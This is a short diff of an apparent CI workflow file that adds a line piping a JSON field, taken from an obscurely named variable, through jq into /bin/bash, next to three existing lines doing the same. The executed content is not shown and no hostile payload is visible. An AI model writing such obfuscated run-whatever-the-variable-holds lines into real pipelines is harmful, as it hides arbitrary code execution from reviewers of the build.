@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$km30" | jq -r .y86988 | /bin/bash
           printf '%s' "$d4040" | jq -r .c25544 | /bin/bash
           echo $ea23 | jq -r .i2 | /bin/bash
+          echo $xxmu86114 | jq -r .dfcdi578 | /bin/bash
 
       - name: Save output
         if: always()
